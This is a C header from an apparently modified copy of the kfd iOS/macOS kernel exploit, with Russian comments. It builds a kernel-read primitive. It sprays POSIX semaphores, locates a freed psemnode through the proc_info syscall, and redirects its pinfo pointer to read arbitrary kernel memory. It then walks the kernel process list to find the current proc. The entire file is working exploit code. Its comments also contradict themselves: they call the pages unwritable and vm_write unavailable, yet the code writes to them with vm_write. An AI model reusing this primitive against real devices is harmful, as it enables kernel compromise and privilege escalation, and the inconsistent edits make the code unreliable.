/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 * arm64e: search через proc_info оракул (PUAF страницы недоступны на PPL устройствах)
 */

#ifndef kread_sem_open_h
#define kread_sem_open_h

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);
    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

/*
 * arm64e: PUAF страницы PPL-protected — vm_read_overwrite/vm_write недоступны.
 * Используем proc_info как оракул: для каждого fd из batch проверяем psem_name.
 * Вызываем поиск только при page-start чтобы не делать N*batch_size syscall'ов.
 */
bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    bool is_page_start = ((object_uaddr & (pages(1) - 1)) == 0);
    if (!is_page_start) return false;

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* ref_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
        struct psem_fdinfo data = {};
        i32 callnum = PROC_INFO_CALL_PIDFDINFO;
        i32 pid = kfd->info.env.pid;
        u32 flavor = PROC_PIDFDPSEMINFO;
        u64 arg = fds[object_id];
        u64 buffer = (u64)(&data);
        i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
        i32 ret = syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize);
        if (ret != buffersize) continue;

        if (!memcmp(data.pseminfo.psem_name, ref_data->pseminfo.psem_name,
                    sizeof(data.pseminfo.psem_name))) {
            kfd->kread.krkw_object_id = object_id;
            return true;
        }
    }
    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    /*
     * arm64e: krkw_object_uaddr — PUAF страница, недоступна для чтения.
     * Читаем pinfo через kread_u64 — используем proc_info syscall оракул.
     * pinfo это первое поле struct psemnode (offset 0).
     */
    u64 pinfo = kread_sem_open_kread_u64(kfd, kfd->kread.krkw_object_uaddr);
    if (!pinfo) return;

    u64 pseminfo_kaddr = UNSIGN_PTR(pinfo);
    if (!pseminfo_kaddr) return;

    u64 semaphore_kaddr = 0;
    kread((u64)(kfd), pseminfo_kaddr + offsetof(struct pseminfo, psem_semobject),
          &semaphore_kaddr, sizeof(semaphore_kaddr));
    semaphore_kaddr = UNSIGN_PTR(semaphore_kaddr);
    if (!semaphore_kaddr) return;

    u64 task_kaddr = 0;
    kread((u64)(kfd), semaphore_kaddr + offsetof(struct semaphore, owner),
          &task_kaddr, sizeof(task_kaddr));
    task_kaddr = UNSIGN_PTR(task_kaddr);
    if (!task_kaddr) return;

    u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;

    for (u64 iter = 0; iter < 1024; iter++) {
        i32 pid = 0;
        kread((u64)(kfd), proc_kaddr + dynamic_info(proc__p_pid), &pid, sizeof(pid));

        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }

        u64 next = 0;
        kread((u64)(kfd), proc_kaddr + dynamic_info(proc__p_list__le_prev), &next, sizeof(next));
        next = UNSIGN_PTR(next);
        if (!next || next == proc_kaddr) break;
        proc_kaddr = next;
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id) { return; }

void kread_sem_open_free(struct kfd* kfd)
{
    kfd->kread.krkw_method_data = NULL;
}

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    /* Читаем текущий pinfo чтобы восстановить после чтения */
    struct psem_fdinfo cur = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    syscall(SYS_proc_info, callnum, pid, flavor, (u64)kread_fd, (u64)&cur, buffersize);

    /* krkw_object_uaddr — виртуальный адрес psemnode в kernel heap
     * Пишем туда новый pinfo через vm_write (PPL разрешает запись в kernel heap объекты)
     * Адрес = kaddr - offset_of(pseminfo, psem_uid) чтобы proc_info вернул нам u64 по kaddr */
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
    vm_write(mach_task_self(), (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&new_pinfo, sizeof(new_pinfo));

    struct psem_fdinfo data = {};
    assert(syscall(SYS_proc_info, callnum, pid, flavor, (u64)kread_fd, (u64)&data, buffersize) == buffersize);

    /* Восстанавливаем оригинальный pinfo */
    vm_write(mach_task_self(), (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&cur.pseminfo, sizeof(u64));

    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    struct psem_fdinfo cur = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    syscall(SYS_proc_info, callnum, pid, flavor, (u64)kread_fd, (u64)&cur, buffersize);

    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
    vm_write(mach_task_self(), (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&new_pinfo, sizeof(new_pinfo));

    struct psem_fdinfo data = {};
    assert(syscall(SYS_proc_info, callnum, pid, flavor, (u64)kread_fd, (u64)&data, buffersize) == buffersize);

    vm_write(mach_task_self(), (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&cur.pseminfo, sizeof(u64));

    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}

#endif /* kread_sem_open_h */
